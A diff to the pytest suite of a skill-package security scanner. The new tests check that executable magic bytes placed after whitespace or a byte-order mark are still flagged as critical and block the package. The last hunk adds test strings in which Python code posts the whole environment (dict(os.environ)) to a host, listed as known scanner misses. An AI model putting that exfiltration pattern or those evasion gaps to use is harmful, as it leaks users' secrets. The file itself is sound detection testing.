@@ -10,7 +10,7 @@ from types import SimpleNamespace
 
 import pytest
 
-from deerflow.skills.package_files import is_executable_binary_prefix
+from deerflow.skills.package_files import EXEC_SNIFF_BYTES, is_executable_binary_prefix
 from deerflow.skills.security_scanner import scan_skill_content
 from deerflow.skills.skillscan import StaticScanBlockedError, enforce_static_scan, scan_archive_preflight, scan_skill_dir
 from deerflow.skills.skillscan.orchestrator import _PYTHON_CLIENT_SINK_METHODS, MAX_FILE_BYTES
@@ -456,8 +456,8 @@ def test_archive_preflight_reports_package_findings(tmp_path: Path) -> None:
 
 @pytest.mark.parametrize(
     "magic",
-    [b"\xce\xfa\xed\xfe", b"\xbe\xba\xfe\xca", b"\xca\xfe\xba\xbf"],
-    ids=["mach-o-32-le", "mach-o-fat-le", "mach-o-fat64-be"],
+    [b"\xce\xfa\xed\xfe", b"\xbe\xba\xfe\xca", b"\xca\xfe\xba\xbf", b"\xbf\xba\xfe\xca"],
+    ids=["mach-o-32-le", "mach-o-fat-le", "mach-o-fat64-be", "mach-o-fat64-le"],
 )
 def test_executable_magic_matches_the_installer_extraction_guard(tmp_path: Path, magic: bytes) -> None:
     skill_dir = tmp_path / "demo-skill"
@@ -470,12 +470,111 @@ def test_executable_magic_matches_the_installer_extraction_guard(tmp_path: Path,
     assert is_executable_binary_prefix(magic)
 
 
+@pytest.mark.parametrize(
+    ("filler", "magic", "evidence"),
+    [
+        pytest.param(b"\n", b"\x7fELF", "ELF", id="newline-elf"),
+        pytest.param(b"   ", b"\x7fELF", "ELF", id="spaces-elf"),
+        pytest.param(b" ", b"MZ", "PE", id="space-pe"),
+        pytest.param(b"\r\n", b"\xca\xfe\xba\xbe", "Mach-O", id="crlf-macho-fat"),
+        pytest.param(b"\xef\xbb\xbf", b"\x7fELF", "ELF", id="utf8-bom-elf"),
+        pytest.param(b"\xef\xbb\xbf", b"\xbf\xba\xfe\xca", "Mach-O", id="utf8-bom-macho-fat64-le"),
+        pytest.param(b"\n", b"\xbf\xba\xfe\xca", "Mach-O", id="newline-macho-fat64-le"),
+    ],
+)
+def test_whitespace_prefixed_executable_magic_is_critical(tmp_path: Path, filler: bytes, magic: bytes, evidence: str) -> None:
+    """A bounded filler run before a full executable magic must still yield a
+    CRITICAL finding that blocks the package."""
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    tool = skill_dir / "assets" / "tool"
+    tool.parent.mkdir(parents=True, exist_ok=True)
+    tool.write_bytes(filler + magic + b"\x00" * 64)
+
+    result = scan_skill_dir(skill_dir)
+
+    finding = _finding_by_rule(result["findings"], "package-executable-binary")
+    assert (finding["file"], finding["severity"], finding["evidence"]) == ("assets/tool", "CRITICAL", evidence)
+    assert result["blocked"] is True
+
+
+def test_whitespace_prefixed_executable_blocks_enforce_static_scan(tmp_path: Path) -> None:
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    helper = skill_dir / "bin" / "helper"
+    helper.parent.mkdir(parents=True, exist_ok=True)
+    helper.write_bytes(b" \t\n" + b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 64)
+
+    with pytest.raises(StaticScanBlockedError):
+        enforce_static_scan(skill_dir, skill_name="demo-skill", app_config=SimpleNamespace(skill_scan=SimpleNamespace(enabled=True)))
+
+
+def test_archive_preflight_flags_whitespace_prefixed_executable(tmp_path: Path) -> None:
+    archive = tmp_path / "demo-skill.skill"
+    with zipfile.ZipFile(archive, "w") as zf:
+        zf.writestr("demo-skill/SKILL.md", "---\nname: demo-skill\ndescription: Demo skill\n---\n")
+        zf.writestr("demo-skill/assets/payload", b"\n" + b"\x7fELF" + b"\x00" * 64)
+
+    result = scan_archive_preflight(archive)
+
+    assert _finding_by_rule(result["findings"], "package-executable-binary")["severity"] == "CRITICAL"
+    assert result["blocked"] is True
+
+
+def test_heavy_whitespace_beyond_the_cap_is_not_an_executable(tmp_path: Path) -> None:
+    """Indented prose must not become a false positive: a run of exactly the
+    64-byte limit is outside the filler run the sniff tolerates."""
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    notes = skill_dir / "assets" / "notes"
+    notes.parent.mkdir(parents=True, exist_ok=True)
+    notes.write_bytes(b" " * 64 + b"MZ, the magic number\n")
+    boundary = skill_dir / "assets" / "boundary"
+    boundary.write_bytes(b" " * 63 + b"MZ, the magic number\n")
+
+    findings = scan_skill_dir(skill_dir)["findings"]
+    assert not [finding for finding in findings if finding["rule_id"] == "package-executable-binary" and finding["file"] == "assets/notes"]
+    assert _finding_by_rule([finding for finding in findings if finding["file"] == "assets/boundary"], "package-executable-binary")["severity"] == "CRITICAL"
+
+
 def test_truncated_mach_o_magic_is_not_an_executable(tmp_path: Path) -> None:
     skill_dir = tmp_path / "demo-skill"
     _write_skill(skill_dir)
     (skill_dir / "data.bin").write_bytes(b"\xfe\xed\xfa\x00\x00\x00\x00\x00")
 
     assert not [finding for finding in scan_skill_dir(skill_dir)["findings"] if finding["rule_id"] == "package-executable-binary"]
+
+
+@pytest.mark.parametrize(
+    ("filler", "magic", "expected"),
+    [
+        (b"\n", b"\x7fELF", True),
+        (b"\x00\t ", b"MZ", True),
+        (b"\xef\xbb\xbf", b"\xca\xfe\xba\xbf", True),
+        (b" " * 63, b"\x7fELF", True),
+        (b" " * 64, b"\x7fELF", False),
+        # A BOM is one sequence; its last byte must not start a Mach-O magic.
+        (b"\xef\xbb\xbf", b"\xba\xfe\xca", False),
+    ],
+    ids=["newline", "nul-whitespace", "bom-then-fat64", "max-offset", "over-max-offset", "bom-not-bytewise"],
+)
+def test_executable_magic_after_bounded_filler(tmp_path: Path, filler: bytes, magic: bytes, expected: bool) -> None:
+    payload = filler + magic + b"\x00" * 64
+    assert EXEC_SNIFF_BYTES == 67
+    assert is_executable_binary_prefix(payload[:EXEC_SNIFF_BYTES]) is expected
+
+    skill_dir = tmp_path / "demo-skill"
+    _write_skill(skill_dir)
+    (skill_dir / "tool").write_bytes(payload)
+    findings = [finding for finding in scan_skill_dir(skill_dir)["findings"] if finding["rule_id"] == "package-executable-binary"]
+    assert bool(findings) is expected
+
+    archive = tmp_path / "demo-skill.skill"
+    with zipfile.ZipFile(archive, "w") as zf:
+        zf.writestr("demo-skill/SKILL.md", "---\nname: demo-skill\ndescription: Demo skill\n---\n")
+        zf.writestr("demo-skill/tool", payload)
+    archive_findings = [finding for finding in scan_archive_preflight(archive)["findings"] if finding["rule_id"] == "package-executable-binary"]
+    assert bool(archive_findings) is expected
 
 
 def test_archive_preflight_rejects_ntfs_ads_colon_member(tmp_path: Path) -> None:
@@ -494,6 +593,30 @@ def test_archive_preflight_rejects_ntfs_ads_colon_member(tmp_path: Path) -> None
     finding = _finding_by_rule(result["findings"], "package-ads-stream-name")
     assert finding["severity"] == "CRITICAL"
     assert finding["file"] == "demo-skill/scripts/run.sh:hidden.txt"
+    assert result["blocked"] is True
+
+
+@pytest.mark.parametrize(
+    ("filler", "magic"),
+    [
+        (b"\n", b"\x7fELF"),
+        (b"\xef\xbb\xbf", b"\x7fELF"),
+        (b" " * 63, b"\xbf\xba\xfe\xca"),
+    ],
+    ids=["newline-elf", "bom-elf", "max-offset-macho-fat64-le"],
+)
+def test_nested_zip_with_filler_prefixed_executable_escalates_to_critical(tmp_path: Path, filler: bytes, magic: bytes) -> None:
+    payload = filler + magic + b"\x00" * 64
+    archive = tmp_path / "demo-skill.skill"
+    with zipfile.ZipFile(archive, "w") as zf:
+        zf.writestr("demo-skill/SKILL.md", "---\nname: demo-skill\ndescription: Demo skill\n---\n")
+        zf.writestr("demo-skill/payload.zip", _nested_zip_bytes("tool", payload))
+
+    result = scan_archive_preflight(archive)
+
+    finding = _finding_by_rule(result["findings"], "package-nested-archive")
+    assert finding["severity"] == "CRITICAL"
+    assert "contains an executable binary member" in (finding["evidence"] or "")
     assert result["blocked"] is True
 
 
@@ -1469,6 +1592,11 @@ def test_python_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
         "import os\nimport requests\n\nsession = requests.Session()\nout = {}\nout[session.post(host, json=dict(os.environ))] = 1\n",
         # Annotation evaluation varies by scope, future flags, and Python version, so it is skipped.
         "import os\nimport requests\n\nsession = requests.Session()\ndef annotated(value: session.post(host, json=dict(os.environ))):\n    pass\n",
+        # Sinks reached through a name bound by a destructuring target (issue #4296): the
+        # simple-name model reads the target's elements for bindings to drop but never records the
+        # values they bind, so the handle the first element really receives is not carried forward.
+        "import os\nimport requests\n\ns, other = requests.Session(), config\ns.post(host, json=dict(os.environ))\n",
+        "import os\nimport requests\n\n[s, other] = [requests.Session(), config]\ns.post(host, json=dict(os.environ))\n",
     ],
 )
 def test_python_declared_false_negatives_stay_unreported(tmp_path: Path, source: str) -> None:
